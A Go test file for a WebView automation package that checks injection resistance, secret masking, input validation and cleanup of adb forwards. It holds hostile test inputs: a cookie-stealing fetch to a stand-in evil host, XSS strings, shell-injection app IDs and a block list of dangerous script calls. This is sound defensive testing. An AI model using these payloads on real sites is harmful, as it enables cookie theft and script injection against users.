package device

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"math"
	"net"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"
	"unicode"

	"github.com/gorilla/websocket"
)

// identityRedact is the Redact of a test that does not look at masking.
func identityRedact(s string) string { return s }

// sessAdb answers the shell commands the session sends and delegates adb forward commands to the recording fakeAdb.
type sessAdb struct {
	*fakeAdb
	table string
	pidof string
}

func (s *sessAdb) RunArgs(ctx context.Context, args ...string) ([]byte, error) {
	if len(args) >= 4 && args[2] == "shell" {
		s.mu.Lock()
		s.calls = append(s.calls, append([]string(nil), args...))
		s.mu.Unlock()
		switch args[3] {
		case "cat":
			return []byte(s.table), nil
		case "pidof":
			return []byte(s.pidof), nil
		}
		return nil, errors.New("unexpected shell command")
	}
	return s.fakeAdb.RunArgs(ctx, args...)
}

func (s *sessAdb) forwardCalls() (created, removed int) {
	for _, c := range s.calls {
		if len(c) > 3 && c[2] == "forward" {
			if c[3] == "--remove" {
				removed++
			} else if c[3] != "--list" {
				created++
			}
		}
	}
	return
}

// pageFake is a fake WebView page: it records every command and answers the lookups from a script.
type pageFake struct {
	*fakeCDP
	mu       sync.Mutex
	commands []recordedCommand
	lookup   func(query string) map[string]any // what findFunction returns for a query
	typeErr  string                            // when set, Input.insertText fails with this message
	dropAt   string                            // when set, the connection is closed when this method arrives
	thrown   string                            // when set, the lookup answers with an exception that quotes this page text
	rawReply func(id float64) string           // when set, the callFunctionOn reply is this raw text instead of a valid answer
}

type recordedCommand struct {
	Method string
	Params map[string]any
	Raw    string
}

func newPageFake(t *testing.T) *pageFake {
	p := &pageFake{fakeCDP: newFakeCDP(t)}
	p.handle = func(c *websocket.Conn, req map[string]any) {
		method, _ := req["method"].(string)
		params, _ := req["params"].(map[string]any)
		raw, _ := json.Marshal(req["params"])
		p.mu.Lock()
		p.commands = append(p.commands, recordedCommand{Method: method, Params: params, Raw: string(raw)})
		p.mu.Unlock()
		if p.dropAt == method {
			c.Close()
			return
		}
		switch method {
		case "Runtime.evaluate":
			answer(c, req, map[string]any{"result": map[string]any{"type": "object", "objectId": "win-1"}})
		case "Runtime.callFunctionOn":
			args, _ := params["arguments"].([]any)
			query := ""
			if len(args) > 1 {
				query, _ = args[1].(map[string]any)["value"].(string)
			}
			if p.rawReply != nil {
				_ = c.WriteMessage(websocket.TextMessage, []byte(p.rawReply(req["id"].(float64))))
				return
			}
			if p.thrown != "" {
				answer(c, req, map[string]any{"result": map[string]any{"type": "object"}, "exceptionDetails": map[string]any{"text": p.thrown, "exception": map[string]any{"description": p.thrown}}})
				return
			}
			v := map[string]any{"count": 0, "visible": false}
			if p.lookup != nil {
				v = p.lookup(query)
			}
			answer(c, req, map[string]any{"result": map[string]any{"type": "object", "value": v}})
		case "Input.insertText":
			if p.typeErr != "" {
				_ = c.WriteJSON(map[string]any{"id": req["id"], "error": map[string]any{"code": -32000, "message": p.typeErr}})
				return
			}
			answer(c, req, map[string]any{})
		default:
			answer(c, req, map[string]any{})
		}
	}
	return p
}

func (p *pageFake) methods() []string {
	p.mu.Lock()
	defer p.mu.Unlock()
	var m []string
	for _, c := range p.commands {
		m = append(m, c.Method)
	}
	return m
}

func (p *pageFake) of(method string) []recordedCommand {
	p.mu.Lock()
	defer p.mu.Unlock()
	var out []recordedCommand
	for _, c := range p.commands {
		if c.Method == method {
			out = append(out, c)
		}
	}
	return out
}

const unixTableFor = "Num RefCount Protocol Flags Type St Inode Path\n0000000000000000: 00000002 00000000 00010000 0001 01 1 @webview_devtools_remote_2783\n0000000000000000: 00000002 00000000 00010000 0001 01 2 @webview_devtools_remote_1707\n"

func sessionFor(t *testing.T, p *pageFake, page string) (*WebViewSession, *sessAdb, error) {
	t.Helper()
	fa := &fakeAdb{forward: func(args []string) ([]byte, error) { return []byte(strconv.Itoa(p.port) + "\n"), nil }}
	ad := &sessAdb{fakeAdb: fa, table: unixTableFor, pidof: "2783\n"}
	s, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", AppID: "com.example.app", Page: page, Redact: identityRedact})
	if err == nil {
		t.Cleanup(func() { _ = s.Close() })
	}
	return s, ad, err
}

func visibleAt(x, y float64, text string) map[string]any {
	return map[string]any{"count": 1, "visible": true, "focused": true, "x": x, "y": y, "w": 112.0, "h": 21.0, "vw": 1000.0, "vh": 2000.0, "text": text}
}

func TestSessionTapsAnElementInsideTheWebView(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any {
		if q == "Contact support" {
			return visibleAt(256, 78, "Contact support")
		}
		return map[string]any{"count": 0, "visible": false}
	}
	s, ad, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	if s.Title() != "Fixture page" {
		t.Fatalf("title = %q", s.Title())
	}
	if err := s.Tap(context.Background(), Text("Contact support")); err != nil {
		t.Fatal(err)
	}
	ev := p.of("Input.dispatchMouseEvent")
	if len(ev) != 2 || ev[0].Params["type"] != "mousePressed" || ev[1].Params["type"] != "mouseReleased" || ev[0].Params["x"] != 256.0 || ev[0].Params["y"] != 78.0 {
		t.Fatalf("mouse events = %+v", ev)
	}
	if err := s.Close(); err != nil {
		t.Fatal(err)
	}
	if created, removed := ad.forwardCalls(); created != 1 || removed != 1 {
		t.Fatalf("forward created %d, removed %d", created, removed)
	}
	// the connection is closed too: a call after Close cannot reach the page
	if _, err := s.Find(context.Background(), Text("Contact support")); err == nil {
		t.Fatal("the page answered after Close")
	}
	if err := s.Close(); err != nil {
		t.Fatalf("a second Close: %v", err)
	}
	if _, removed := ad.forwardCalls(); removed != 1 {
		t.Fatalf("the forward was removed %d times", removed)
	}
	ad.assertSafe(t)
}

var hostileQueries = []string{
	`"); fetch('http://evil.invalid/' + document.cookie); //`,
	`');fetch(1)//`,
	`</script><script>alert(1)</script>`,
	`\"`,
	`\`,
	"line1\nline2",
	"a b c",
	`#a >>> .b::shadow .c`,
	`[`,
	`:has(`,
	"`${alert(1)}`",
	"\x00",
	"\u202eevil",
	`#x{background:url(javascript:alert(1))}`,
}

func TestHostileQueriesNeverBecomeJavaScript(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any { return visibleAt(10, 10, "ok") }
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	for _, q := range hostileQueries {
		before := len(p.commands)
		if _, err := s.Find(context.Background(), Text(q)); err != nil {
			t.Fatalf("%q: %v", q, err)
		}
		p.mu.Lock()
		cmds := append([]recordedCommand(nil), p.commands[before:]...)
		p.mu.Unlock()
		if len(cmds) != 2 || cmds[0].Method != "Runtime.evaluate" || cmds[1].Method != "Runtime.callFunctionOn" {
			t.Fatalf("%q: commands = %+v", q, cmds)
		}
		// the first command is the fixed window lookup, with no query in it
		if cmds[0].Params["expression"] != "window" || strings.Contains(cmds[0].Raw, strings.TrimSpace(q)) && len(strings.TrimSpace(q)) > 3 {
			t.Errorf("%q: the window lookup carries the query: %s", q, cmds[0].Raw)
		}
		call := cmds[1].Params
		if call["functionDeclaration"] != findFunction {
			t.Errorf("%q: the function is not the fixed template", q)
		}
		args := call["arguments"].([]any)
		if len(args) != 4 || args[0].(map[string]any)["value"] != "text" || args[1].(map[string]any)["value"] != q || args[2].(map[string]any)["value"] != float64(maxElementText) || args[3].(map[string]any)["value"] != "find" {
			t.Errorf("%q: arguments = %v", q, args)
		}
		// nothing but the fixed template and the JSON arguments: the other fields hold no query text
		for k, v := range call {
			if k == "arguments" || k == "functionDeclaration" {
				continue
			}
			if b, _ := json.Marshal(v); strings.Contains(string(b), strings.TrimSpace(q)) && len(strings.TrimSpace(q)) > 3 {
				t.Errorf("%q: field %s carries the query", q, k)
			}
		}
	}
	// the methods ever used: only the lookup, never evaluate with page code from a query
	for _, m := range p.methods() {
		if m != "Runtime.evaluate" && m != "Runtime.callFunctionOn" {
			t.Errorf("unexpected command %s", m)
		}
	}
	for _, c := range p.of("Runtime.evaluate") {
		if c.Params["expression"] != "window" {
			t.Errorf("an evaluate with other code: %v", c.Params)
		}
	}
}

func TestTheFixedTemplateHasNoPlaceholderForTheQuery(t *testing.T) {
	// the template is one constant: it mentions no script fragment that could take text from outside, and it does not change between calls
	for _, bad := range []string{"eval(", "Function(", "fetch(", "XMLHttpRequest", "innerHTML", "outerHTML", "document.write", "location"} {
		if strings.Contains(findFunction, bad) {
			t.Errorf("the template contains %q", bad)
		}
	}
}

func TestAVeryLongSelectorIsRefusedBeforeItIsSent(t *testing.T) {
	p := newPageFake(t)
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	long := strings.Repeat("a", 100_000)
	for _, f := range []func() error{
		func() error { _, err := s.Find(context.Background(), Text(long)); return err },
		func() error { return s.Tap(context.Background(), Text(long)) },
		func() error { return s.Type(context.Background(), Text(long), "x") },
	} {
		err := f()
		var we *WebViewError
		if !errors.As(err, &we) || we.Kind != "too long" || len(err.Error()) > 200 {
			t.Fatalf("err = %v", err)
		}
	}
	if len(p.of("Runtime.callFunctionOn")) != 0 {
		t.Fatal("a refused selector was sent")
	}
	err = s.Type(context.Background(), CSS("#a"), strings.Repeat("x", maxTypedChars+1))
	var we *WebViewError
	if !errors.As(err, &we) || we.Kind != "too long" {
		t.Fatalf("a very long text: err = %v", err)
	}
	if _, err := s.Find(context.Background(), Text("")); err == nil {
		t.Fatal("an empty selector was accepted")
	}
}

func TestInvalidSelectorsAreReportedWithoutEchoingThemWhole(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any { return map[string]any{"invalid": true} }
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	for _, q := range []string{"[", ":has(", "#a[", "." + strings.Repeat("z", 1500)} {
		_, err := s.Find(context.Background(), Text(q))
		var we *WebViewError
		if !errors.As(err, &we) || we.Kind != "invalid selector" {
			t.Fatalf("%q: err = %v", q, err)
		}
		if len([]rune(err.Error())) > 120 {
			t.Fatalf("the error is %d characters: %s", len([]rune(err.Error())), err)
		}
	}
}

func TestElementTextAndErrorsAreBoundedAndScrubbed(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any {
		return visibleAt(1, 2, "A\nB\x00\x1b[31m"+strings.Repeat("Z", 5000)+"\u202e")
	}
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	info, err := s.Find(context.Background(), Text("x"))
	if err != nil {
		t.Fatal(err)
	}
	if n := len([]rune(info.Text)); n > maxShownChars+1 {
		t.Fatalf("text has %d characters", n)
	}
	for _, r := range info.Text {
		if !unicode.IsPrint(r) {
			t.Fatalf("a character that is not printable (%U) in %q", r, info.Text)
		}
	}
}

func TestMissingAndHiddenElementsUseTheProposalWording(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any {
		if q == "hidden" {
			return map[string]any{"count": 2, "visible": false}
		}
		return map[string]any{"count": 0, "visible": false}
	}
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	err = s.Tap(context.Background(), Text("nothing"))
	var we *WebViewError
	if !errors.As(err, &we) || we.Kind != "not found" || err.Error() != `No element in the WebView page "Fixture page" matches "nothing"` {
		t.Fatalf("err = %v", err)
	}
	err = s.Tap(context.Background(), Text("hidden"))
	if !errors.As(err, &we) || we.Kind != "not visible" || !strings.Contains(err.Error(), "exists in the WebView page") || !strings.Contains(err.Error(), "not visible") {
		t.Fatalf("err = %v", err)
	}
	if len(p.of("Input.dispatchMouseEvent")) != 0 {
		t.Fatal("a mouse event was sent for an element that was not found or not visible")
	}
}

func TestTypeInsertsTheTextAndNeverRepeatsIt(t *testing.T) {
	const secret = "pw-9f8e7d"
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any { return visibleAt(5, 5, "") }
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	if err := s.Type(context.Background(), CSS("#message"), secret); err != nil {
		t.Fatal(err)
	}
	ins := p.of("Input.insertText")
	if len(ins) != 1 || ins[0].Params["text"] != secret {
		t.Fatalf("insertText = %+v", ins)
	}
	// the focus lookup asked for mode "focus" and carries no typed text
	calls := p.of("Runtime.callFunctionOn")
	args := calls[len(calls)-1].Params["arguments"].([]any)
	if args[3].(map[string]any)["value"] != "focus" || strings.Contains(calls[len(calls)-1].Raw, secret) {
		t.Fatalf("focus lookup = %s", calls[len(calls)-1].Raw)
	}
	// a page error that quotes the typed text does not reach the caller
	p.typeErr = "cannot insert " + secret + " here"
	err = s.Type(context.Background(), CSS("#message"), secret)
	var we *WebViewError
	if err == nil || strings.Contains(err.Error(), secret) || !errors.As(err, &we) || we.Kind != "page error" || !strings.HasPrefix(err.Error(), "the WebView page refused the command") {
		t.Fatalf("err = %v", err)
	}
}

func TestAnExceptionInTheLookupIsReportedWithoutThePageText(t *testing.T) {
	const pageText = "Uncaught secret-page-text-123 at https://shop.example/private"
	p := newPageFake(t)
	p.thrown = pageText
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	_, err = s.Find(context.Background(), Text("x"))
	var we *WebViewError
	if !errors.As(err, &we) || we.Kind != "page error" || strings.Contains(err.Error(), "secret-page-text") || strings.Contains(err.Error(), "shop.example") {
		t.Fatalf("err = %v", err)
	}
}

func TestOpenFailuresUseTheProposalWordingAndRemoveTheForward(t *testing.T) {
	type tc struct {
		name  string
		setup func(p *pageFake, ad *sessAdb)
		page  string
		kind  string
		want  string
		fwd   bool // whether a forward was created (and so must be removed)
	}
	cases := []tc{
		{"no socket for the app", func(p *pageFake, ad *sessAdb) { ad.table = unixTableFor[:strings.Index(unixTableFor, "0000")] }, "", "no webview", "no WebView debugging socket was found", false},
		{"app not running", func(p *pageFake, ad *sessAdb) { ad.pidof = "" }, "", "no webview", "The app is not running", false},
		{"no pages", func(p *pageFake, ad *sessAdb) {
			p.list = func(w http.ResponseWriter, r *http.Request) { _, _ = w.Write([]byte("[]")) }
		}, "", "no webview", "No WebView page is open", true},
		{"several pages, none named", func(p *pageFake, ad *sessAdb) {
			p.list = twoPages(p)
		}, "", "several pages", `Found 2 WebView pages ("Checkout", "Help")`, true},
		{"no page matches the name", func(p *pageFake, ad *sessAdb) { p.list = twoPages(p) }, "zzz", "no match", `No WebView page matches "zzz" (2 pages open`, true},
		{"the name matches several", func(p *pageFake, ad *sessAdb) { p.list = twoPages(p) }, "e", "several pages", `"e" matches 2 WebView pages`, true},
		{"the page list fails", func(p *pageFake, ad *sessAdb) {
			p.list = func(w http.ResponseWriter, r *http.Request) { http.Error(w, "boom", 500) }
		}, "", "", "answered 500", true},
		{"the debugger address is not loopback", func(p *pageFake, ad *sessAdb) {
			p.list = func(w http.ResponseWriter, r *http.Request) {
				_, _ = w.Write([]byte(`[{"id":"1","type":"page","title":"T","webSocketDebuggerUrl":"ws://example.invalid:9/devtools/page/1"}]`))
			}
		}, "", "", "no usable debugger address", true},
	}
	for _, c := range cases {
		p := newPageFake(t)
		fa := &fakeAdb{forward: func(args []string) ([]byte, error) { return []byte(strconv.Itoa(p.port) + "\n"), nil }}
		ad := &sessAdb{fakeAdb: fa, table: unixTableFor, pidof: "2783\n"}
		c.setup(p, ad)
		s, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", AppID: "com.example.app", Page: c.page, Redact: identityRedact})
		if err == nil {
			_ = s.Close()
			t.Fatalf("%s: no error", c.name)
		}
		if !strings.Contains(err.Error(), c.want) {
			t.Errorf("%s: err = %v, want it to contain %q", c.name, err, c.want)
		}
		var we *WebViewError
		if c.kind != "" && (!errors.As(err, &we) || we.Kind != c.kind) {
			t.Errorf("%s: kind = %v, want %q", c.name, err, c.kind)
		}
		for _, bad := range []string{"/devtools/", "ws://", "example.invalid", "%!"} {
			if strings.Contains(err.Error(), bad) {
				t.Errorf("%s: the error contains %q: %v", c.name, bad, err)
			}
		}
		created, removed := ad.forwardCalls()
		if c.fwd && (created != 1 || removed != 1) {
			t.Errorf("%s: forward created %d, removed %d (fail closed)", c.name, created, removed)
		}
		if !c.fwd && created != 0 {
			t.Errorf("%s: a forward was created", c.name)
		}
		ad.assertSafe(t)
	}
}

func twoPages(p *pageFake) func(w http.ResponseWriter, r *http.Request) {
	return func(w http.ResponseWriter, r *http.Request) {
		_ = json.NewEncoder(w).Encode([]Target{
			{ID: "1", Type: "page", Title: "Checkout", URL: "https://shop.example/pay", WebSocketDebuggerURL: "ws://127.0.0.1:" + strconv.Itoa(p.port) + "/devtools/page/1"},
			{ID: "2", Type: "page", Title: "Help", URL: "https://shop.example/help", WebSocketDebuggerURL: "ws://127.0.0.1:" + strconv.Itoa(p.port) + "/devtools/page/1"},
		})
	}
}

func TestPageIsChosenByAPartOfTheTitleOrTheURL(t *testing.T) {
	for _, page := range []string{"check", "CHECKOUT", "shop.example/pay", "/PAY"} {
		p := newPageFake(t)
		p.list = twoPages(p)
		s, ad, err := sessionFor(t, p, page)
		if err != nil {
			t.Fatalf("%q: %v", page, err)
		}
		if s.Title() != "Checkout" {
			t.Errorf("%q: title = %q", page, s.Title())
		}
		_ = s.Close()
		ad.assertSafe(t)
	}
}

func TestAppIDIsCheckedBeforeItReachesTheDevice(t *testing.T) {
	for _, bad := range []string{"a b;c'd", "com.example.app; reboot", "$(id)", "", "x", "com..", "com.example.app\n"} {
		ad := &sessAdb{fakeAdb: &fakeAdb{}, table: unixTableFor, pidof: "1\n"}
		_, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", AppID: bad, Redact: identityRedact})
		if err == nil {
			t.Errorf("app id %q accepted", bad)
		}
		if len(ad.calls) != 0 {
			t.Errorf("app id %q reached adb: %v", bad, ad.calls)
		}
	}
	// a given process id needs no app id
	p := newPageFake(t)
	fa := &fakeAdb{forward: func(args []string) ([]byte, error) { return []byte(strconv.Itoa(p.port) + "\n"), nil }}
	ad := &sessAdb{fakeAdb: fa, table: unixTableFor}
	s, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", PID: 2783, Redact: identityRedact})
	if err != nil {
		t.Fatal(err)
	}
	_ = s.Close()
	// the other process's socket is never used for this pid
	if _, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", PID: 555, Redact: identityRedact}); err == nil {
		t.Fatal("a pid with no socket opened a session")
	}
}

func TestAConnectionLostInTheMiddleOfAStepIsReportedAndCleanedUp(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any { return visibleAt(1, 1, "x") }
	s, ad, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	p.dropAt = "Runtime.callFunctionOn"
	err = s.Tap(context.Background(), Text("x"))
	var we *WebViewError
	if !errors.As(err, &we) || we.Kind != "connection lost" {
		t.Fatalf("err = %v", err)
	}
	for _, bad := range []string{"/devtools/", "ws://", "%!"} {
		if strings.Contains(err.Error(), bad) {
			t.Fatalf("the error contains %q: %v", bad, err)
		}
	}
	if err := s.Close(); err != nil {
		t.Fatal(err)
	}
	if _, removed := ad.forwardCalls(); removed != 1 {
		t.Fatalf("removed %d", removed)
	}
}

func TestWithWebViewClosesWhateverTheStepDoes(t *testing.T) {
	boom := errors.New("step failed")
	for name, fn := range map[string]func(*WebViewSession) error{
		"success": func(*WebViewSession) error { return nil },
		"failure": func(*WebViewSession) error { return boom },
	} {
		p := newPageFake(t)
		fa := &fakeAdb{forward: func(args []string) ([]byte, error) { return []byte(strconv.Itoa(p.port) + "\n"), nil }}
		ad := &sessAdb{fakeAdb: fa, table: unixTableFor, pidof: "2783\n"}
		err := WithWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", AppID: "com.example.app", Redact: identityRedact}, fn)
		if (name == "failure") != errors.Is(err, boom) {
			t.Errorf("%s: err = %v", name, err)
		}
		if created, removed := ad.forwardCalls(); created != 1 || removed != 1 {
			t.Errorf("%s: created %d removed %d", name, created, removed)
		}
	}
}

func TestWaitForPollsUntilTheElementAppears(t *testing.T) {
	p := newPageFake(t)
	polls := 0
	p.lookup = func(q string) map[string]any {
		polls++
		if polls < 3 {
			return map[string]any{"count": 0, "visible": false}
		}
		return visibleAt(1, 1, "Message sent")
	}
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	if err := s.WaitFor(context.Background(), Text("Message sent"), 5*time.Second); err != nil || polls != 3 {
		t.Fatalf("polls = %d, err = %v", polls, err)
	}
	p.lookup = func(q string) map[string]any { return map[string]any{"count": 0, "visible": false} }
	err = s.WaitFor(context.Background(), Text("never"), 300*time.Millisecond)
	var we *WebViewError
	if !errors.As(err, &we) || !strings.Contains(err.Error(), "Timed out") {
		t.Fatalf("err = %v", err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if err := s.WaitFor(ctx, Text("never"), time.Minute); err == nil {
		t.Fatal("a cancelled wait returned no error")
	}
}

var _ = fmt.Sprintf

func TestRedactHookMasksEveryTextThatCameFromThePageOrTheScript(t *testing.T) {
	const secret = "hunter2-token-77"
	mask := func(s string) string { return strings.ReplaceAll(s, secret, "****") }
	p := newPageFake(t)
	p.list = func(w http.ResponseWriter, r *http.Request) {
		_ = json.NewEncoder(w).Encode([]Target{
			{ID: "1", Type: "page", Title: "Account " + secret, URL: "https://x.example/a", WebSocketDebuggerURL: "ws://127.0.0.1:" + strconv.Itoa(p.port) + "/devtools/page/1"},
			{ID: "2", Type: "page", Title: "Other", URL: "https://x.example/b", WebSocketDebuggerURL: "ws://127.0.0.1:" + strconv.Itoa(p.port) + "/devtools/page/1"},
			{ID: "3", Type: "page", Title: "Second " + secret, URL: "https://x.example/c", WebSocketDebuggerURL: "ws://127.0.0.1:" + strconv.Itoa(p.port) + "/devtools/page/1"},
		})
	}
	newAdb := func() *sessAdb {
		fa := &fakeAdb{forward: func(args []string) ([]byte, error) { return []byte(strconv.Itoa(p.port) + "\n"), nil }}
		return &sessAdb{fakeAdb: fa, table: unixTableFor, pidof: "2783\n"}
	}
	// the page titles in the "several pages" message, and the name the script gave
	_, err := OpenWebView(context.Background(), WebViewOptions{Runner: newAdb(), Serial: "emulator-5600", AppID: "com.example.app", Redact: mask})
	if err == nil || strings.Contains(err.Error(), secret) || !strings.Contains(err.Error(), "****") {
		t.Fatalf("titles: err = %v", err)
	}
	_, err = OpenWebView(context.Background(), WebViewOptions{Runner: newAdb(), Serial: "emulator-5600", AppID: "com.example.app", Page: secret + "-nope", Redact: mask})
	if err == nil || strings.Contains(err.Error(), secret) {
		t.Fatalf("page name: err = %v", err)
	}
	// a name that matches several pages is repeated without the secret too
	_, err = OpenWebView(context.Background(), WebViewOptions{Runner: newAdb(), Serial: "emulator-5600", AppID: "com.example.app", Page: secret, Redact: mask})
	if err == nil || strings.Contains(err.Error(), secret) || !strings.Contains(err.Error(), "matches 2 WebView pages") {
		t.Fatalf("a name that matches several pages: err = %v", err)
	}
	// the page chosen by a name: its title is masked in the session and in the messages that use it
	p.lookup = func(q string) map[string]any { return map[string]any{"count": 0, "visible": false} }
	chosen, err := OpenWebView(context.Background(), WebViewOptions{Runner: newAdb(), Serial: "emulator-5600", AppID: "com.example.app", Page: "account", Redact: mask})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(chosen.Title(), secret) {
		t.Fatalf("the title carries the secret: %q", chosen.Title())
	}
	if err := chosen.Tap(context.Background(), Text("nothing")); err == nil || strings.Contains(err.Error(), secret) {
		t.Fatalf("the not-found message carries the secret: %v", err)
	}
	_ = chosen.Close()
	// the page chosen, the element text, a page error and the query
	p.list = nil
	p.lookup = func(q string) map[string]any {
		if q == "gone" || strings.Contains(q, secret) {
			return map[string]any{"count": 0, "visible": false}
		}
		return visibleAt(1, 1, "balance "+secret)
	}
	s, err := OpenWebView(context.Background(), WebViewOptions{Runner: newAdb(), Serial: "emulator-5600", AppID: "com.example.app", Redact: mask})
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	info, err := s.Find(context.Background(), Text("x"))
	if err != nil || strings.Contains(info.Text, secret) || !strings.Contains(info.Text, "****") {
		t.Fatalf("element text = %q, %v", info.Text, err)
	}
	p.lookup = func(q string) map[string]any {
		if strings.Contains(q, "invalid-"+secret) {
			return map[string]any{"invalid": true}
		}
		return map[string]any{"count": 0, "visible": false}
	}
	if _, err := s.Find(context.Background(), CSS("[invalid-"+secret)); err == nil || strings.Contains(err.Error(), secret) {
		t.Fatalf("the query reached the invalid-selector message: %v", err)
	}
	err = s.Tap(context.Background(), CSS("#field-"+secret))
	if err == nil || strings.Contains(err.Error(), secret) {
		t.Fatalf("the query reached the not-found message: %v", err)
	}
	p.typeErr = "bad value " + secret
	p.lookup = func(q string) map[string]any { return visibleAt(1, 1, "") }
	err = s.Type(context.Background(), CSS("#f"), "other-text-here")
	if err == nil || strings.Contains(err.Error(), secret) || !strings.Contains(err.Error(), "****") {
		t.Fatalf("the page's error text was not masked: %v", err)
	}
}

func TestCallTimeoutIsAnOptionOfTheSession(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any { time.Sleep(600 * time.Millisecond); return visibleAt(1, 1, "x") }
	fa := &fakeAdb{forward: func(args []string) ([]byte, error) { return []byte(strconv.Itoa(p.port) + "\n"), nil }}
	ad := &sessAdb{fakeAdb: fa, table: unixTableFor, pidof: "2783\n"}
	// a short timeout ends a slow command without a deadline of its own
	s, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", AppID: "com.example.app", CallTimeout: 150 * time.Millisecond, Redact: identityRedact})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s.Find(context.Background(), Text("x")); err == nil {
		t.Fatal("the slow command was not ended by the call timeout")
	}
	_ = s.Close()
	// a long one lets the same command finish
	ad2 := &sessAdb{fakeAdb: &fakeAdb{forward: fa.forward}, table: unixTableFor, pidof: "2783\n"}
	s2, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad2, Serial: "emulator-5600", AppID: "com.example.app", CallTimeout: 5 * time.Second, Redact: identityRedact})
	if err != nil {
		t.Fatal(err)
	}
	defer s2.Close()
	if info, err := s2.Find(context.Background(), Text("x")); err != nil || !info.Visible {
		t.Fatalf("the command did not finish under a long timeout: %+v, %v", info, err)
	}
}

func TestAPanicInTheRedactHookDuringOpenRemovesTheForwardAndClosesTheConnection(t *testing.T) {
	p := newPageFake(t)
	fa := &fakeAdb{forward: func(args []string) ([]byte, error) { return []byte(strconv.Itoa(p.port) + "\n"), nil }}
	ad := &sessAdb{fakeAdb: fa, table: unixTableFor, pidof: "2783\n"}
	var recovered any
	func() {
		defer func() { recovered = recover() }()
		_, _ = OpenWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", AppID: "com.example.app", Redact: func(string) string { panic("redact exploded") }})
	}()
	if recovered != "redact exploded" {
		t.Fatalf("the panic did not propagate unchanged: %v", recovered)
	}
	if created, removed := ad.forwardCalls(); created != 1 || removed != 1 {
		t.Fatalf("forward created %d, removed %d after a panic", created, removed)
	}
	deadline := time.Now().Add(2 * time.Second)
	for p.active.Load() != 0 && time.Now().Before(deadline) {
		time.Sleep(20 * time.Millisecond)
	}
	if n := p.active.Load(); n != 0 {
		t.Fatalf("%d WebSocket connection(s) were left open after the panic", n)
	}
	ad.assertSafe(t)
}

func TestNumbersFromThePageAreCheckedBeforeAnythingIsDoneWithThem(t *testing.T) {
	good := visibleAt(100, 100, "x")
	with := func(k string, v any) map[string]any {
		m := map[string]any{}
		for a, b := range good {
			m[a] = b
		}
		m[k] = v
		return m
	}
	cases := map[string]map[string]any{
		"huge x":                with("x", 1e308),
		"negative x":            with("x", -1.0),
		"negative y":            with("y", -0.5),
		"x past the viewport":   with("x", 1500.0),
		"y past the viewport":   with("y", 2500.0),
		"huge width":            with("w", 1e308),
		"negative width":        with("w", -3.0),
		"huge height":           with("h", 1e12),
		"zero viewport":         with("vw", 0.0),
		"huge viewport":         with("vh", 1e12),
		"negative count":        with("count", -1),
		"absurd count":          with("count", 1e9),
		"negative count hidden": map[string]any{"count": -5, "visible": false},
	}
	for name, v := range cases {
		p := newPageFake(t)
		v := v
		p.lookup = func(string) map[string]any { return v }
		s, _, err := sessionFor(t, p, "")
		if err != nil {
			t.Fatal(err)
		}
		if _, err := s.Find(context.Background(), Text("x")); err == nil {
			t.Errorf("%s: Find accepted it", name)
		}
		if err := s.Tap(context.Background(), Text("x")); err == nil {
			t.Errorf("%s: Tap accepted it", name)
		}
		if n := len(p.of("Input.dispatchMouseEvent")); n != 0 {
			t.Errorf("%s: %d mouse event(s) were sent for a position the page made up", name, n)
		}
	}
	// the sane edge cases pass
	p := newPageFake(t)
	p.lookup = func(string) map[string]any { return with("x", 1000.0) } // exactly on the viewport edge
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s.Find(context.Background(), Text("x")); err != nil {
		t.Fatalf("a position on the viewport edge was refused: %v", err)
	}
}

func TestAReplyToOurCommandThatCannotBeDecodedFailsFastNotAfterTheTimeout(t *testing.T) {
	nested := func(id float64) string {
		return fmt.Sprintf(`{"id":%d,"result":%s%s}`, int(id), strings.Repeat("[", 100_000), strings.Repeat("]", 100_000))
	}
	replies := map[string]func(id float64) string{
		"NaN literal":  func(id float64) string { return fmt.Sprintf(`{"id":%d,"result":NaN}`, int(id)) },
		"truncated":    func(id float64) string { return fmt.Sprintf(`{"id":%d,"result":{"a":`, int(id)) },
		"deep nesting": nested,
		"id first with spaces": func(id float64) string {
			return fmt.Sprintf(` { "id" : %d , "result": nope }`, int(id))
		},
	}
	for name, mk := range replies {
		f := newFakeCDP(t)
		mk := mk
		f.handle = func(c *websocket.Conn, req map[string]any) {
